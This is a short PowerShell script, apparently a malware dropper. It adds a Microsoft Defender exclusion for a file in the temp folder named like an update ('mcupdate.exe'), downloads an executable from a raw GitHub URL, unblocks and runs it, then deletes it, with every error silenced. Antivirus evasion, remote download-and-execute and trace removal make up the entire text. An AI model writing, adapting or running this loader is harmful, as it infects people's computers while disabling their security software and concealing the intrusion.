 $repo = "https://raw.githubusercontent.com/cync911-cloud/4/main"
 $dst  = "$env:TEMP\mcupdate.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    Add-MpPreference -ExclusionPath $dst -ErrorAction SilentlyContinue
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("$repo/Nailong.exe", $dst)
    Unblock-File $dst -ErrorAction SilentlyContinue
    Start-Process $dst
    Start-Sleep -Seconds 5
    if (Test-Path $dst) { Remove-Item $dst -Force -ErrorAction SilentlyContinue }
} catch {}
